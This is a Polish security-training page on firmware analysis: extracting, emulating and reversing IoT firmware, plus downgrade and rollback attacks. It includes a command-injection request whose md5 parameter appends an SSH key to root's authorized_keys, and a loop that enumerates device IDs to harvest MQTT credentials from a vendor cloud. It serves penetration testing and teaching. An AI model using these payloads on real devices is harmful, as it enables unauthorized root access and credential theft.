# Analiza firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Wprowadzenie**

### Powiązane zasoby

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware to kluczowe oprogramowanie umożliwiające prawidłowe działanie urządzeń poprzez zarządzanie komunikacją między komponentami sprzętowymi a oprogramowaniem, z którym użytkownicy mają styczność, oraz ułatwianie tej komunikacji. Jest przechowywany w pamięci trwałej, dzięki czemu urządzenie może uzyskać dostęp do niezbędnych instrukcji od momentu włączenia, co prowadzi do uruchomienia systemu operacyjnego. Analiza i potencjalna modyfikacja firmware'u to krytyczny etap identyfikowania luk w zabezpieczeniach.<sup>[[2]](#references)[[3]](#references)</sup>

## **Gromadzenie informacji**

**Gromadzenie informacji** to krytyczny początkowy etap poznawania budowy urządzenia i wykorzystywanych przez nie technologii. Proces ten obejmuje zbieranie danych dotyczących:

- Architektury CPU i uruchomionego systemu operacyjnego
- Szczegółów bootloadera
- Układu sprzętowego i datasheetów
- Metryk codebase'u i lokalizacji kodu źródłowego
- Zewnętrznych bibliotek i typów licencji
- Historii aktualizacji i certyfikacji regulacyjnych
- Diagramów architektury i przepływu
- Ocen bezpieczeństwa i zidentyfikowanych luk

W tym celu nieocenione są narzędzia **open-source intelligence (OSINT)**, podobnie jak analiza wszelkich dostępnych komponentów open-source przeprowadzana ręcznie i automatycznie. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) oferują bezpłatną analizę statyczną, którą można wykorzystać do wykrywania potencjalnych problemów.

## **Pozyskiwanie firmware'u**

Firmware można pozyskać na różne sposoby, z których każdy charakteryzuje się innym poziomem złożoności:

- **Bezpośrednio** ze źródła (developerów, producentów)
- **Budując** go zgodnie z dostarczonymi instrukcjami
- **Pobierając** z oficjalnych stron wsparcia
- Wykorzystując zapytania **Google dork** do wyszukiwania hostowanych plików firmware'u
- Uzyskując bezpośredni dostęp do **cloud storage**, za pomocą narzędzi takich jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Przechwytując **aktualizacje** za pomocą technik man-in-the-middle
- **Ekstrahując** je z urządzenia przez połączenia takie jak **UART**, **JTAG** lub **PICit**
- **Sniffując** żądania aktualizacji w komunikacji urządzenia
- Identyfikując i wykorzystując **hardcoded update endpoints**
- **Dumpując** je z bootloadera lub sieci
- **Wyjmując i odczytując** układ pamięci, gdy wszystkie inne metody zawiodą, przy użyciu odpowiednich narzędzi sprzętowych

### Logi tylko przez UART: wymuszenie root shell przez env U-Boot w pamięci flash

Jeśli UART RX jest ignorowany (dostępne są tylko logi), nadal możesz wymusić init shell poprzez **offline'ową edycję bloku środowiska U-Boot**:<sup>[[6]](#references)</sup>

1. Zrzuć zawartość SPI flash za pomocą klipsa SOIC-8 i programatora (3,3 V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Zlokalizuj partycję env U-Boot, edytuj `bootargs`, aby zawierało `init=/bin/sh`, i **ponownie oblicz CRC32 środowiska U-Boot** dla tego bloku.
3. Ponownie zaprogramuj wyłącznie partycję env i uruchom urządzenie ponownie; shell powinien pojawić się na UART.

Jest to przydatne w urządzeniach embedded, w których shell bootloadera jest wyłączony, ale partycja env może być zapisywana przez zewnętrzny dostęp do pamięci flash.

## Analizowanie firmware'u

Skoro **masz już firmware**, musisz wyodrębnić informacje na jego temat, aby wiedzieć, jak się z nim obchodzić. Możesz użyć do tego różnych narzędzi:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Jeśli za pomocą tych narzędzi nie znajdziesz zbyt wiele, sprawdź **entropię** obrazu za pomocą `binwalk -E <bin>` — jeśli entropia jest niska, obraz prawdopodobnie nie jest zaszyfrowany. Jeśli entropia jest wysoka, prawdopodobnie jest zaszyfrowany (lub w jakiś sposób skompresowany).

Ponadto możesz użyć tych narzędzi do wyodrębnienia **plików osadzonych wewnątrz firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Możesz również użyć [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) do zbadania pliku.

### Uzyskiwanie systemu plików

Korzystając z wcześniej omówionych narzędzi, takich jak `binwalk -ev <bin>`, powinno być możliwe **wyodrębnienie systemu plików**.\
Binwalk zazwyczaj wyodrębnia go do **folderu nazwanego zgodnie z typem systemu plików**, którym zwykle jest jeden z następujących: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ręczne wyodrębnianie systemu plików

Czasami binwalk **nie będzie mieć magicznego bajtu systemu plików w swoich sygnaturach**. W takich przypadkach użyj binwalk do **znalezienia offsetu systemu plików, wycięcia skompresowanego systemu plików** z pliku binarnego oraz **ręcznego wyodrębnienia** systemu plików zgodnie z jego typem, korzystając z poniższych kroków.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Uruchom następujące polecenie **dd**, wyodrębniając system plików Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatywnie można również uruchomić następujące polecenie.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Dla squashfs (używanego w powyższym przykładzie)

`$ unsquashfs dir.squashfs`

Pliki będą następnie znajdować się w katalogu "`squashfs-root`".

- Pliki archiwów CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Dla systemów plików jffs2

`$ jefferson rootfsfile.jffs2`

- Dla systemów plików ubifs z pamięcią flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza Firmware

Po uzyskaniu firmware niezbędne jest jego przeanalizowanie w celu zrozumienia jego struktury i potencjalnych podatności. Proces ten obejmuje wykorzystanie różnych narzędzi do analizy i wyodrębniania cennych danych z obrazu firmware.

### Narzędzia do wstępnej analizy

Poniżej przedstawiono zestaw poleceń do wstępnej inspekcji pliku binarnego (określanego jako `<bin>`). Polecenia te pomagają zidentyfikować typy plików, wyodrębnić stringi, przeanalizować dane binarne oraz zrozumieć szczegóły partycji i systemu plików:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Aby ocenić stan szyfrowania obrazu, sprawdza się jego **entropię** za pomocą `binwalk -E <bin>`. Niska entropia sugeruje brak szyfrowania, natomiast wysoka entropia wskazuje na możliwe szyfrowanie lub kompresję.

Do wyodrębniania **osadzonych plików** zalecane są narzędzia i zasoby, takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.

### Wyodrębnianie systemu plików

Za pomocą `binwalk -ev <bin>` można zazwyczaj wyodrębnić system plików, często do katalogu o nazwie odpowiadającej typowi systemu plików (np. squashfs, ubifs). Jednak gdy **binwalk** nie rozpoznaje typu systemu plików z powodu braku magicznych bajtów, konieczne jest ręczne wyodrębnienie. Polega to na użyciu `binwalk` w celu znalezienia offsetu systemu plików, a następnie polecenia `dd` do wycięcia systemu plików:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Następnie, w zależności od typu systemu plików (np. squashfs, cpio, jffs2, ubifs), używa się różnych poleceń do ręcznego wyodrębnienia zawartości.

### Analiza systemu plików

Po wyodrębnieniu systemu plików rozpoczyna się wyszukiwanie luk w zabezpieczeniach. Zwraca się uwagę na niezabezpieczone demony sieciowe, hardcoded credentials, endpointy API, funkcje serwera aktualizacji, nieskompilowany kod, skrypty startowe oraz skompilowane pliki binarne przeznaczone do analizy offline.

**Kluczowe lokalizacje** i **elementy** do sprawdzenia obejmują:

- **etc/shadow** i **etc/passwd** pod kątem danych uwierzytelniających użytkowników
- Certyfikaty SSL i klucze w **etc/ssl**
- Pliki konfiguracyjne i skrypty pod kątem potencjalnych luk
- Wbudowane pliki binarne do dalszej analizy
- Typowe serwery webowe i pliki binarne urządzeń IoT

W odkrywaniu poufnych informacji i luk w systemie plików pomagają różne narzędzia:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) do wyszukiwania poufnych informacji
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) do kompleksowej analizy firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) do analizy statycznej i dynamicznej

### Kontrole bezpieczeństwa skompilowanych plików binarnych

Zarówno kod źródłowy, jak i skompilowane pliki binarne znalezione w systemie plików muszą zostać dokładnie sprawdzone pod kątem luk. Narzędzia takie jak **checksec.sh** dla plików binarnych Unix oraz **PESecurity** dla plików binarnych Windows pomagają identyfikować niezabezpieczone pliki binarne, które mogą zostać wykorzystane.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Wiele hubów IoT pobiera konfigurację dla konkretnego urządzenia z endpointu cloud, który wygląda następująco:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Podczas analizy firmware możesz odkryć, że `<token>` jest lokalnie wyprowadzany z identyfikatora urządzenia przy użyciu hardcoded secret, na przykład:

- token = MD5( deviceId || STATIC_KEY ) i reprezentowany jako wielkie litery hex

Taka konstrukcja umożliwia każdemu, kto pozna deviceId i STATIC_KEY, odtworzenie URL-a oraz pobranie konfiguracji cloud, często ujawniającej plaintext MQTT credentials i prefiksy tematów.

Praktyczny workflow:

1) Wyodrębnij deviceId z logów startowych UART

- Podłącz adapter UART 3.3 V (TX/RX/GND) i przechwyć logi:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Poszukaj wierszy wyświetlających wzorzec URL konfiguracji cloud oraz adres brokera, na przykład:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Odzyskaj STATIC_KEY i algorytm tokenu z firmware

- Wczytaj pliki binarne do Ghidra/radare2 i wyszukaj ścieżkę konfiguracji ("/pf/") lub użycie MD5.
- Potwierdź algorytm (np. MD5(deviceId||STATIC_KEY)).
- Wygeneruj token w Bashu i zamień skrót na wielkie litery:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Zbierz konfigurację chmurową i dane uwierzytelniające MQTT

- Utwórz URL i pobierz JSON za pomocą curl; przeanalizuj go przy użyciu jq, aby wyodrębnić sekrety:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Wykorzystaj plaintext MQTT i słabe ACL-e tematów (jeśli występują)

- Użyj odzyskanych poświadczeń, aby zasubskrybować tematy utrzymaniowe i wyszukać wrażliwe zdarzenia:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumeruj przewidywalne identyfikatory urządzeń (na dużą skalę, za autoryzacją)

- Wiele ekosystemów osadza bajty OUI/produktu/typu, po których następuje sekwencyjny sufiks.
- Możesz iterować po kandydujących identyfikatorach, programowo wyprowadzać tokeny i pobierać konfiguracje:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notatki
- Zawsze uzyskaj wyraźną autoryzację przed podjęciem próby masowej enumeracji.
- W miarę możliwości preferuj emulację lub analizę statyczną w celu odzyskania sekretów bez modyfikowania docelowego hardware'u.


Proces emulacji firmware'u umożliwia **analizę dynamiczną** działania urządzenia lub pojedynczego programu. Podejście to może napotkać problemy związane z zależnościami od hardware'u lub architektury, jednak przeniesienie głównego systemu plików albo określonych plików binarnych na urządzenie o zgodnej architekturze i kolejności bajtów, takie jak Raspberry Pi, lub do gotowej maszyny wirtualnej może ułatwić dalsze testowanie.

### Emulacja pojedynczych plików binarnych

W przypadku badania pojedynczych programów kluczowe jest określenie kolejności bajtów programu oraz architektury CPU.

#### Przykład z architekturą MIPS

Aby emulować plik binarny dla architektury MIPS, można użyć polecenia:
```bash
file ./squashfs-root/bin/busybox
```
A także, aby zainstalować niezbędne narzędzia emulacyjne:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
W przypadku MIPS (big-endian) używa się `qemu-mips`, a dla binariów little-endian właściwym wyborem będzie `qemu-mipsel`.

#### Emulacja architektury ARM

W przypadku binariów ARM proces jest podobny — do emulacji używa się emulatora `qemu-arm`.

### Emulacja całego systemu

Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i inne umożliwiają emulację całego firmware'u, automatyzując ten proces i wspomagając dynamiczną analizę.

## Dynamiczna analiza w praktyce

Na tym etapie do analizy używa się rzeczywistego lub emulowanego środowiska urządzenia. Należy zapewnić sobie dostęp do powłoki systemu operacyjnego i systemu plików. Emulacja może nie odwzorowywać idealnie interakcji ze sprzętem, dlatego czasami konieczne jest ponowne uruchomienie emulacji. Analiza powinna obejmować ponowne zbadanie systemu plików, wykorzystanie ujawnionych stron internetowych i usług sieciowych oraz analizę podatności bootloadera. Testy integralności firmware'u mają kluczowe znaczenie dla identyfikacji potencjalnych podatności typu backdoor.

## Techniki analizy w czasie działania

Analiza w czasie działania polega na interakcji z procesem lub binarium w jego środowisku operacyjnym przy użyciu narzędzi takich jak gdb-multiarch, Frida i Ghidra w celu ustawiania breakpointów oraz identyfikowania podatności za pomocą fuzzingu i innych technik.

W przypadku celów embedded bez pełnego debuggera **skopiuj statycznie linkowany `gdbserver`** na urządzenie i podłącz się zdalnie:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Mapowanie komunikatów Zigbee / radio-co-processor

W hubach IoT stos RF jest często podzielony między **radio MCU** a proces użytkownika systemu Linux. Przydatny przepływ pracy polega na zmapowaniu ścieżki:<sup>[[8]](#references)</sup>

1. **Ramka RF** przesyłana drogą radiową
2. **parser po stronie kontrolera** na radio MCU
3. **tekstowy protokół szeregowy/UART lub TLV** przekazywany do systemu Linux (na przykład `/dev/tty*`)
4. **dispatcher aplikacji** w głównym daemonie
5. **handler / state machine specyficzny dla protokołu**

Taka architektura tworzy dwa cele reverse engineeringu zamiast jednego. Jeśli kontroler konwertuje binarne ramki radiowe na protokół tekstowy, taki jak `Group,Command,arg1,arg2,...`, odzyskaj:

- **message groups** i tabele dispatchera
- Które komunikaty mogą pochodzić z **sieci**, a które z samego kontrolera
- Dokładne **manufacturer-specific discriminator fields** (na przykład Zigbee `manufacturer_code` i niestandardowe `cluster_command`)
- Które handlery są osiągalne tylko podczas **commissioning**, wykrywania lub pobierania firmware/modelu

W przypadku Zigbee przechwytuj ruch podczas parowania i sprawdź, czy cel nadal korzysta z domyślnego **Link Key** `ZigBeeAlliance09`. Jeśli tak, sniffing ruchu commissioning może ujawnić **Network Key**. Zigbee 3.0 install codes zmniejszają to ryzyko, dlatego odnotuj, czy testowane urządzenie rzeczywiście ich wymaga.

### Manufacturer-specific protocol handlers i osiągalność kontrolowana przez FSM

Specyficzne dla vendora komendy Zigbee/ZCL są często lepszym celem niż standaryzowane klastry, ponieważ trafiają do **custom parsing code** oraz wewnętrznych **FSM**, które przeszły mniej testów walidacyjnych.<sup>[[8]](#references)</sup>

Praktyczny workflow:

- Przeanalizuj command dispatcher, aż znajdziesz **vendor-only handler**.
- Odzyskaj tabele **FSM state**, **event**, **check**, **action** i **next-state**.
- Zidentyfikuj **transitional states**, które przechodzą automatycznie, oraz gałęzie retry/error, które ostatecznie resetują lub zwalniają dane kontrolowane przez atakującego.
- Potwierdź, jakie prawidłowe wymiany protokołu są wymagane, aby umieścić daemon w podatnym stanie, zamiast zakładać, że wadliwy handler jest zawsze osiągalny.

W przypadku protokołów wrażliwych na czas replay pakietów z użyciem frameworka Python może być zbyt wolny. Bardziej niezawodnym podejściem jest emulowanie prawidłowego urządzenia na rzeczywistym hardware (na przykład **nRF52840**) z użyciem stosu klasy vendorskiej, aby można było udostępnić właściwe **endpoints**, **attributes** i timing commissioning.

### Klasa błędów fragmented-download w embedded daemons

Powtarzająca się klasa błędów firmware występuje w **fragmented blob/model/configuration downloads**:<sup>[[8]](#references)</sup>

1. **Pierwszy fragment** (`offset == 0`) zapisuje `ctx->total_size` i wykonuje alokację `malloc(total_size)`.
2. Późniejsze fragmenty sprawdzają wyłącznie kontrolowane przez atakującego pola **packet-local**, takie jak `packet_total_size >= offset + chunk_len`.
3. Kopiowanie korzysta z `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez sprawdzenia względem **oryginalnego rozmiaru alokacji**.

Pozwala to atakującemu wysłać:

- Pierwszy poprawny fragment z **małym** zadeklarowanym rozmiarem całkowitym, aby wymusić małą alokację na heapie.
- Późniejszy fragment z **oczekiwanym offsetem**, ale większym `chunk_len`.
- Sfałszowany rozmiar packet-local, który spełnia nowe kontrole, a jednocześnie przepełnia pierwotnie zaalokowany bufor.

Jeśli podatna ścieżka znajduje się za logiką commissioning, exploit musi obejmować wystarczającą **device emulation**, aby przeprowadzić cel do oczekiwanego stanu pobierania modelu lub bloba przed wysłaniem nieprawidłowych fragmentów.

### Wyzwalacze `free()` sterowane przez protokół

W embedded daemons najłatwiejszym sposobem wywołania heap metadata exploitation często nie jest „czekanie na cleanup”, lecz **wymuszenie własnej obsługi błędów protokołu**:<sup>[[8]](#references)</sup>

- Wyślij nieprawidłowe kolejne fragmenty, aby skierować FSM do stanów **retry** lub **error**.
- Przekrocz próg retry, aby daemon **zresetował kontekst** i zwolnił uszkodzony bufor.
- Wykorzystaj to przewidywalne `free()` do uruchomienia allocator-side primitives, zanim proces ulegnie awarii z niezwiązanych przyczyn.

Jest to szczególnie przydatne przeciwko allocatorom **musl/uClibc/dlmalloc-like** w embedded Linux, gdzie uszkodzenie chunk metadata może przekształcić logikę unlink/unbin w write primitive. Stabilny wzorzec polega na uszkodzeniu **size field**, aby przekierować przechodzenie allocatora do **fake chunks umieszczonych w przepełnionym buforze**, zamiast natychmiast nadpisywać prawdziwe bin pointers i powodować awarię procesu.

## Binary Exploitation i Proof-of-Concept

Tworzenie PoC dla zidentyfikowanych podatności wymaga dogłębnego zrozumienia architektury celu oraz programowania w językach niskopoziomowych. Binarnе zabezpieczenia runtime w systemach embedded są rzadkie, ale gdy występują, konieczne może być użycie technik takich jak Return Oriented Programming (ROP).

### Uwagi dotyczące fastbin exploitation w uClibc (embedded Linux)

- **Fastbins + consolidation:** uClibc korzysta z fastbins podobnych do glibc. Późniejsza duża alokacja może uruchomić `__malloc_consolidate()`, dlatego każdy fake chunk musi przejść kontrole (prawidłowy rozmiar, `fd = 0` oraz sąsiednie chunki rozpoznawane jako „in use”).<sup>[[6]](#references)</sup>
- **Binarne pliki non-PIE z ASLR:** jeśli ASLR jest włączony, ale główny binarny plik jest **non-PIE**, adresy `.data/.bss` wewnątrz binarnego pliku są stabilne. Można wybrać obszar, który już przypomina poprawny nagłówek chunka heap, aby skierować alokację fastbin do **function pointer table**.
- **NUL zatrzymujący parser:** podczas parsowania JSON znak `\x00` może zatrzymać parsowanie, zachowując końcowe bajty kontrolowane przez atakującego na potrzeby stack pivot/łańcucha ROP.
- **Shellcode przez `/proc/self/mem`:** łańcuch ROP wywołujący `open("/proc/self/mem")`, `lseek()` i `write()` może umieścić wykonywalny shellcode w znanym mappingu i przeskoczyć do niego.

## Przygotowane systemy operacyjne do analizy firmware

Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) udostępniają wstępnie skonfigurowane środowiska do testów bezpieczeństwa firmware, wyposażone w niezbędne narzędzia.

## Przygotowane OS-y do analizy firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to dystrybucja przeznaczona do przeprowadzania security assessment i penetration testing urządzeń Internet of Things (IoT). Oszczędza dużo czasu, udostępniając wstępnie skonfigurowane środowisko ze wszystkimi załadowanymi niezbędnymi narzędziami.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): system operacyjny do embedded security testing oparty na Ubuntu 18.04, zawierający wstępnie załadowane narzędzia do testowania bezpieczeństwa firmware.

## Firmware Downgrade Attacks i niezabezpieczone mechanizmy aktualizacji

Nawet gdy vendor implementuje kryptograficzne sprawdzanie podpisów obrazów firmware, **ochrona przed version rollback (downgrade) jest często pomijana**. Gdy boot- lub recovery-loader sprawdza jedynie podpis przy użyciu osadzonego klucza publicznego, ale nie porównuje *wersji* (ani monotonic counter) flashowanego obrazu, atakujący może legalnie zainstalować **starszy, podatny firmware, który nadal ma poprawny podpis**, i w ten sposób ponownie wprowadzić załatane podatności.<sup>[[4]](#references)</sup>

Typowy workflow ataku:

1. **Uzyskaj starszy podpisany obraz**
* Pobierz go z publicznego portalu pobierania vendora, CDN lub strony wsparcia.
* Wyodrębnij go z towarzyszących aplikacji mobilnych/desktopowych (np. z `assets/firmware/` wewnątrz Android APK).
* Pobierz go z repozytoriów zewnętrznych, takich jak VirusTotal, archiwa internetowe, fora itp.
2. **Prześlij lub udostępnij obraz urządzeniu** za pośrednictwem dowolnego dostępnego kanału aktualizacji:
* Web UI, mobile-app API, USB, TFTP, MQTT itp.
* Wiele konsumenckich urządzeń IoT udostępnia *nieuwierzytelnione* endpointy HTTP(S), które akceptują zakodowane w Base64 bloby firmware, dekodują je po stronie serwera i uruchamiają recovery/upgrade.
3. Po downgrade wykorzystaj podatność, która została załatana w nowszej wersji (na przykład filtr command injection dodany później).
4. Opcjonalnie ponownie wgraj najnowszy obraz lub wyłącz aktualizacje, aby uniknąć wykrycia po uzyskaniu persistence.

### Przykład: Command Injection po downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
W podatnym (obniżonym) firmware parametr `md5` jest bezpośrednio łączony z poleceniem shell bez sanityzacji, co umożliwia wstrzykiwanie dowolnych poleceń (w tym przypadku — włączenie dostępu root opartego na kluczach SSH). Późniejsze wersje firmware wprowadziły podstawowy filtr znaków, jednak brak ochrony przed downgrade sprawia, że poprawka jest nieskuteczna.<sup>[[4]](#references)</sup>

### Wyodrębnianie firmware z aplikacji mobilnych

Wielu dostawców dołącza pełne obrazy firmware do swoich towarzyszących aplikacji mobilnych, aby aplikacja mogła aktualizować urządzenie przez Bluetooth/Wi-Fi. Pakiety te są często przechowywane w postaci niezaszyfrowanej w APK/APEX, w ścieżkach takich jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra` czy nawet zwykłe `unzip` pozwalają pobrać podpisane obrazy bez dotykania fizycznego sprzętu.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Ominięcie anti-rollback działające wyłącznie w updaterze w projektach z układem slotów A/B

Niektórzy dostawcy implementują **ratchet** anti-downgrade, ale wyłącznie w logice *updatera* (na przykład w procedurze UDS przez CAN, komendzie recovery lub agencie OTA działającym w userspace). Jeśli **bootloader** sprawdza później wyłącznie sygnaturę/CRC obrazu i ufa tablicy partycji lub metadanym slotu, ochrona przed rollbackiem nadal może zostać obejścia.<sup>[[7]](#references)</sup>

Typowy słaby projekt:

- Metadane firmware zawierają zarówno deskryptor wersji, jak i **security ratchet** / licznik monotoniczny.
- Updater porównuje ratchet obrazu z wartością zapisaną w pamięci trwałej i odrzuca starsze podpisane obrazy.
- **Bootloader** nie parsuje tego ratchet i przed uruchomieniem wybranego slotu weryfikuje wyłącznie nagłówek, CRC oraz sygnaturę.
- Aktywacja slotu jest zapisywana osobno w tablicy partycji lub w liczniku generacji danego slotu i nie jest kryptograficznie powiązana z dokładnym digestem firmware, który został zweryfikowany.

Tworzy to w systemach z dwoma slotami prymityw **validate-one-image / boot-another-image**. Jeśli atakujący może sprawić, że updater oznaczy slot B jako następny cel bootowania, używając aktualnego podpisanego obrazu, a następnie nadpisać slot B przed rebootem, **bootloader** może nadal uruchomić obraz po downgrade, ponieważ ufa wyłącznie wcześniej zatwierdzonym metadanym slotu.

Typowy schemat nadużycia:

1. Wgraj **aktualny podpisany** firmware do pasywnego slotu i uruchom standardową procedurę walidacji/przełączenia, aby układ oznaczył ten slot jako następny aktywny.
2. **Nie wykonuj jeszcze rebootu**. W tej samej sesji ponownie wywołaj procedurę przygotowania/wymazywania slotu.
3. Wykorzystaj nieaktualny stan bootowania lub nieaktualną logikę wyboru slotu, aby updater wymazał **ten sam fizyczny slot**, który właśnie został promowany.
4. Zapisz w tym slocie **starszy, ale nadal podpisany** firmware.
5. Pomiń procedurę walidacji wymuszającą ratchet i wykonaj bezpośredni reboot.
6. **Bootloader** wybiera promowany slot, weryfikuje wyłącznie sygnaturę/integralność i uruchamia stary obraz.

Elementy, na które należy zwrócić uwagę podczas reverse engineeringu implementacji aktualizacji A/B:

- Wybór slotu wyprowadzany z **flag ustawianych podczas bootowania**, które nie są odświeżane po pomyślnym przełączeniu.
- Procedura w stylu `prepare_passive_slot()`, która wymazuje slot na podstawie nieaktualnego stanu zamiast **aktualnego zatwierdzonego układu**.
- Funkcja w stylu `part_write_layout()`, która jedynie zwiększa **licznik generacji** / aktywną flagę i nie zapisuje hasha zweryfikowanego obrazu.
- Sprawdzanie ratchet zaimplementowane w userspace lub kodzie updatera, ale **nieobecne w ROM-ie / bootloaderze / etapach secure boot**.
- Procedury wymazywania lub recovery, które pozostawiają slot oznaczony jako możliwy do bootowania, nawet po usunięciu i ponownym zapisaniu jego zawartości.

### Lista kontrolna oceny logiki aktualizacji

* Czy transport uwierzytelniania *update endpoint* jest odpowiednio chroniony (TLS + uwierzytelnianie)?
* Czy urządzenie porównuje **numery wersji** lub **monotoniczny licznik anti-rollback** przed flashowaniem?
* Czy obraz jest weryfikowany w ramach łańcucha secure boot (np. sygnatury są sprawdzane przez kod ROM)?
* Czy **bootloader wymusza ten sam ratchet** co updater, zamiast sprawdzać wyłącznie sygnaturę/CRC?
* Czy metadane aktywacji slotu są **powiązane ze zweryfikowanym digestem/wersją firmware**, czy slot można modyfikować po jego promocji?
* Po pomyślnym przełączeniu slotu urządzenie jest zmuszane do rebootu, czy późniejsze procedury aktualizacji/wymazywania są nadal dostępne w tej samej sesji?
* Czy kod userland wykonuje dodatkowe kontrole poprawności (np. dozwolona mapa partycji, numer modelu)?
* Czy przepływy aktualizacji *partial* lub *backup* ponownie wykorzystują tę samą logikę walidacji?

> 💡  Jeśli któregokolwiek z powyższych elementów brakuje, platforma prawdopodobnie jest podatna na ataki rollback.

## Vulnerable firmware to practice

Aby ćwiczyć wykrywanie podatności w firmware, wykorzystaj poniższe projekty podatnego firmware jako punkt wyjścia.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
